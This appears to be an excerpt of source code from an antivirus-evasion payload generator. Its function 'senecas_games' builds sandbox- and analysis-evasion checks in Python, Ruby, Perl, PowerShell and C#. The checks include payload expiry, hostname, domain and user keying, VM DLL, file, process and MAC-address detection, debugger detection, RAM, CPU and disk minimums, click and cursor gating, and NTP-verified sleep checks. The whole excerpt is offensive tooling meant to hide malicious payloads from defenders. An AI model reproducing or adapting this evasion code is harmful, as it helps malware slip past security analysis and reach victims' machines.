...
def senecas_games(bypass_payload):
    ...
    if bypass_payload.language == 'python':
        if bypass_payload.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
            ...
            expiredate = str(todaysdate + timedelta(days=int(bypass_payload.required_options["EXPIRE_PAYLOAD"][0])))
        ...
        if bypass_payload.required_options["HOSTNAME"][0].lower() != "x":
            ...
            check_code += '\t' * num_tabs_required + 'if \"' + bypass_payload.required_options["HOSTNAME"][0].lower() + '\" in ' + rand_hostname + '.lower():\n'
        ...
        if bypass_payload.required_options["DOMAIN"][0].lower() != "x":
            ...
            check_code += '\t' * num_tabs_required + 'if \"' + bypass_payload.required_options["DOMAIN"][0].lower() + '\" in ' + rand_domain + '.lower():\n'
        ...
        if bypass_payload.required_options["PROCESSORS"][0].lower() != "x":
            ...
            rand_processor_count = bypass_helpers.randomString()
            ...
            check_code += '\t' * num_tabs_required + 'if ' + rand_processor_count + ' >= ' + bypass_payload.required_options["PROCESSORS"][0] + ':\n'
        ...
        if bypass_payload.required_options["USERNAME"][0].lower() != "x":
            ...
            check_code += '\t' * num_tabs_required + 'if \'' + bypass_payload.required_options["USERNAME"][0].lower() + '\' in ' + rand_user_name + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["DETECTDEBUG"][0].lower() != "false":

            is_debugger_present = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["VIRTUALDLLS"][0].lower() != "false":

            evidenceof_sandbox = bypass_helpers.randomString()
            sandbox_dlls = bypass_helpers.randomString()
            all_pids = bypass_helpers.randomString()
            pid = bypass_helpers.randomString()
            hProcess = bypass_helpers.randomString()
            curProcessDLLs = bypass_helpers.randomString()
            dll = bypass_helpers.randomString()
            dll_name = bypass_helpers.randomString()
            sandbox_dll = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["MINRAM"][0].lower() != "false":

            class_name = bypass_helpers.randomString()
            field_name = bypass_helpers.randomString()
            memory_status = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["CLICKTRACK"][0].lower() != "x":
            ...
            rand_counter = bypass_helpers.randomString()
            minimum_clicks = bypass_helpers.randomString()
            left_click = bypass_helpers.randomString()
            right_click = bypass_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'import win32api\n'
            check_code += '\t' * num_tabs_required + rand_counter + " = 0\n"
            check_code += '\t' * num_tabs_required + minimum_clicks + " = " + bypass_payload.required_options["CLICKTRACK"][0] + "\n"
        ...
        if bypass_payload.required_options["VIRTUALFILES"][0].lower() != "false":

            vmfiles_exist = bypass_helpers.randomString()
            files_tocheck = bypass_helpers.randomString()
            file_path = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["CURSORMOVEMENT"][0].lower() != "false":

            seconds = bypass_helpers.randomString()
            x_position = bypass_helpers.randomString()
            y_position = bypass_helpers.randomString()
            x2_position = bypass_helpers.randomString()
            y2_position = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["USERPROMPT"][0].lower() != "false":
            ...
            popup_title = bypass_helpers.randomString()
            popup_message = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["SANDBOXPROCESS"][0].lower() != "false":

            sandbox_exist = bypass_helpers.randomString()
            bad_procs = bypass_helpers.randomString()
            current_processes = bypass_helpers.randomString()
            process = bypass_helpers.randomString()
            sandbox_proc = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["UTCCHECK"][0].lower() != "false":
            ...
            time_import = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["SLEEP"][0].lower() != "x":
            ...
            rand_time_name = bypass_helpers.randomString()
            ...
            check_code += '\t' * num_tabs_required + 'sleep(' + bypass_payload.required_options["SLEEP"][0] + ')\n'
            check_code += '\t' * num_tabs_required + 'client.sendto((bytes.fromhex("1b") + 47 * bytes.fromhex("01")), ("us.pool.ntp.org",123))\n'
            check_code += '\t' * num_tabs_required + 'msg, address = client.recvfrom( 1024 )\n'
            check_code += '\t' * num_tabs_required + 'if ((datetime.datetime.fromtimestamp((struct.unpack("!12I",msg)[10] - 2208988800)) - ' + rand_time_name + ').seconds >= ' + bypass_payload.required_options["SLEEP"][0] + '):\n'
    ...
    elif bypass_payload.language == 'ruby':

        if bypass_payload.required_options["HOSTNAME"][0].lower() != "x":

            check_code += 'require \'socket\'\n'
            check_code += 'hostname = Socket.gethostname.downcase\n'
            check_code += 'if hostname[\"' + bypass_payload.required_options["HOSTNAME"][0].lower() + '\"]\n'
        ...
        if bypass_payload.required_options["DOMAIN"][0].lower() != "x":
            ...
            check_code += 'if domain[\"' + bypass_payload.required_options["DOMAIN"][0].lower() + '\"]\n'
        ...
        if bypass_payload.required_options["USERNAME"][0].lower() != "x":
            ...
            check_code += 'if name[\"' + bypass_payload.required_options["USERNAME"][0].lower() + '\"]\n'
        ...
        #if bypass_payload.required_options["NUMPROCS"][0].lower() != "x":
        #    check_code += "require 'win32ole'\n"
        #    check_code += 'if (WIN32OLE.connect("winmgmts://").ExecQuery("SELECT NumberOfCores FROM Win32_Processor").to_enum.first.NumberOfCores >= ' + bypass_payload.required_options["NUMPROCS"][0] + ')\n'

            # Add a tab for this check
        #    num_tabs_required += 1

        #if bypass_payload.required_options["MINRAM"][0].lower() != 'x':

        #if bypass_payload.required_options["USERPROMPT"][0].lower() != "x":

        ##    title_bar = bypass_helpers.randomString()
         #   body_text = bypass_helpers.randomString()
         #   winapi_call = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["SLEEP"][0].lower() != "x":
            ...
            check_code += 'sleep(' + bypass_payload.required_options["SLEEP"][0] + ')\n'
            check_code += 'sock = UDPSocket.new;sock.connect("us.pool.ntp.org", 123);sock.print ntp_msg;sock.flush;data,_ = sock.recvfrom(960)\n'
            check_code += 'if (Time.at(data.unpack("B319 B32 B32")[1].to_i(2) - 2208988800) - firstTime >= ' + bypass_payload.required_options["SLEEP"][0] + ')\n'
    ...
    elif bypass_payload.language == 'perl':
        if bypass_payload.required_options["HOSTNAME"][0].lower() != "x":

            rand_hostname = bypass_helpers.randomString()
            check_code += '\t' * num_tabs_required + 'Use Sys::Hostname;\n'
            check_code += '\t' * num_tabs_required + 'my $' + rand_hostname + ' = hostname;\n'
            check_code += '\t' * num_tabs_required + 'if (index(lc($' + rand_hostname + '), lc(' + bypass_payload.required_options["HOSTNAME"][0] + ')) != -1){\n'
        ...
        if bypass_payload.required_options["USERPROMPT"][0].lower() != 'x':
            ...
            flags = bypass_helpers.randomString()
            title_bar_prompt = bypass_helpers.randomString()
            message_prompt = bypass_helpers.randomString()
            msg_box = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["RAMSIZE"][0].lower() != 'x':

            wmi_cim = bypass_helpers.randomString()
            total_ram = bypass_helpers.randomString()
            subMem = bypass_helpers.randomString()
            ...
            check_code += '\t' * num_tabs_required + '}\n'
            check_code += '\t' * num_tabs_required + 'if ($' + total_ram + '/1073741824 > ' + bypass_payload.required_options["RAMSIZE"][0] + ') {\n'

            # Add a tab for this check
            num_tabs_required += 1

        if bypass_payload.required_options["FILENAME"][0].lower() != 'x':

            expected_name = bypass_helpers.randomString()
            actual_name = bypass_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'use File::Basename;\n'
            check_code += '\t' * num_tabs_required + 'my $' + expected_name + ' = "' + bypass_payload.required_options["FILENAME"][0].lower() + '";\n'
        ...
        if bypass_payload.required_options["NUMPROCS"][0].lower() != 'x':
            ...
            min_procs = bypass_helpers.randomString()
            wmi_var = bypass_helpers.randomString()
            total_procs = bypass_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'use Win32::OLE;\n'
            check_code += '\t' * num_tabs_required + 'my $' + min_procs + ' = ' + bypass_payload.required_options["NUMPROCS"][0] + ';\n'
        ...
        if bypass_payload.required_options["DISKSIZE"][0].lower() != 'x':
            ...
            min_disksize = bypass_helpers.randomString()
            file_object = bypass_helpers.randomString()
            real_disksize = bypass_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'use Win32::OLE;\n'
            check_code += '\t' * num_tabs_required + 'my $' + min_disksize + ' = ' + bypass_payload.required_options['DISKSIZE'][0] + ';\n'
        ...
        if bypass_payload.required_options["NUMCLICKS"][0].lower() != 'x':

            perl_min_clicks = bypass_helpers.randomString()
            perl_key_state = bypass_helpers.randomString()
            click_count = bypass_helpers.randomString()
            perl_leftclick = bypass_helpers.randomString()
            perl_rightclick = bypass_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'my $' + perl_min_clicks + ' = ' + bypass_payload.required_options["NUMCLICKS"][0] + ';\n'
        ...
        if bypass_payload.required_options["REGSIZE"][0].lower() != 'x':

            reg_mb_size = bypass_helpers.randomString()
            perl_wmi = bypass_helpers.randomString()
            reg_dump = bypass_helpers.randomString()
            reg_size = bypass_helpers.randomString()
            perl_reg_obj = bypass_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'use Win32::OLE;\n'
            check_code += '\t' * num_tabs_required + 'my $' + reg_mb_size + ' = ' + bypass_payload.required_options["REGSIZE"][0] + ';\n'
        ...
        if bypass_payload.required_options["USERNAME"][0].lower() != "x":
            ...
            rand_name = bypass_helpers.randomString()

            check_code += '\t' * num_tabs_required + 'my $' + rand_name + ' = Win32::LoginName;\n'
            check_code += '\t' * num_tabs_required + 'if (index(lc($' + rand_name + '), lc(\"' + bypass_payload.required_options["USERNAME"][0] + '\")) != -1){\n'
        ...
        if bypass_payload.required_options["DOMAIN"][0].lower() != "x":
            ...
            check_code += '\t' * num_tabs_required + 'if (index(lc($' + rand_domain + '), lc(\"' + bypass_payload.required_options["DOMAIN"][0] + '\")) != -1){\n'
        ...
        if bypass_payload.required_options["PROCESSORS"][0].lower() != "x":
            ...
            rand_corecount = bypass_helpers.randomString()
            check_code += '\t' * num_tabs_required + 'my $' + rand_corecount + ' = $ENV{\"NUMBER_OF_PROCESSORS\"};'
            check_code += '\t' * num_tabs_required + 'if ($' + rand_corecount + ' >=  '+ bypass_payload.required_options["PROCESSORS"][0] + '){\n'
        ...
        if bypass_payload.required_options["SLEEP"][0].lower() != "x":
            ...
            check_code += '\t' * num_tabs_required + 'my $newSock = IO::Socket::INET->new(Proto => "udp",PeerPort => 123,PeerAddr => "us.pool.ntp.org",Timeout => 4);\n'
            check_code += '\t' * num_tabs_required + 'if ((($secondTime - 2208988800) - $firstTime) >= ' + bypass_payload.required_options["SLEEP"][0] + ') {\n'
        ...
        if bypass_payload.required_options["UTCCHECK"][0].lower() != "false":
            ...
            standard_time_zone = bypass_helpers.randomString()
            daylight_time_zone = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["VIRTUALPROC"][0].lower() != "false":

            evidenceof_sandbox = bypass_helpers.randomString()
            sandbox_processes = bypass_helpers.randomString()
            running_processes = bypass_helpers.randomString()
            running_proc = bypass_helpers.randomString()
            sandbox_proc = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["MINBROWSERS"][0].lower() != "false":

            browser_count = bypass_helpers.randomString()
            browser_keys = bypass_helpers.randomString()
            browser_key = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["BADMACS"][0].lower() != "false":
            ...
            sand_macs = bypass_helpers.randomString()
            bad_macs = bypass_helpers.randomString()
            current_macs = bypass_helpers.randomString()
            mac_addy = bypass_helpers.randomString()
            badmac_addy = bypass_helpers.randomString()
        ...
        if bypass_payload.required_options["MINPROCESSES"][0].lower() != "x":

            minimum_processes = bypass_helpers.randomString()
            running_procs = bypass_helpers.randomString()

            check_code += '$' + minimum_processes + ' = ' + bypass_payload.required_options["MINPROCESSES"][0] + '\n'
            check_code += '$' + running_procs + ' = (Get-Process).count\n'
            check_code += 'if ($' + running_procs + ' -ge $' + minimum_processes + ') {\n'
            num_tabs_required += 1

        if bypass_payload.required_options["DOMAIN"][0].lower() != "x":
            check_code += "if((Get-WMIObject -Class Win32_ComputerSystem).Domain -eq \"" + bypass_payload.required_options["DOMAIN"][0].lower() + "\") {\n"
            num_tabs_required += 1

        if bypass_payload.required_options["USERNAME"][0].lower() != "x":
            check_code += "if($env:username -eq \"" + bypass_payload.required_options["USERNAME"][0].lower() + "\") {\n"
            num_tabs_required += 1

        if bypass_payload.required_options["PROCESSORS"][0].lower() != "x":
            check_code += "if((Get-WMIObject -Class Win32_Processor).NumberOfLogicalProcessors -ge " + bypass_payload.required_options["PROCESSORS"][0].lower() + ") {\n"
            num_tabs_required += 1
        ...
        if bypass_payload.required_options["SLEEP"][0].lower() != "x":
            ...
            check_code += "Start-Sleep -s " + bypass_payload.required_options["SLEEP"][0] + ";"
            ...
            check_code += "if ((New-Object DateTime(1900,1,1,0,0,0,[DateTimeKind]::Utc)).AddMilliseconds([UInt64]($runTotal*1000)).Second - $firstTime -ge " + bypass_payload.required_options["SLEEP"][0] + " -or $noAccess) {\n"
            num_tabs_required += 1

        if bypass_payload.required_options["USERPROMPT"][0].lower() != "false":

            dialog_title = bypass_helpers.randomString()
            dialog_text = bypass_helpers.randomString()
            message_box = bypass_helpers.randomString()
    ...
    elif bypass_payload.language == 'cs':
        if bypass_payload.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":
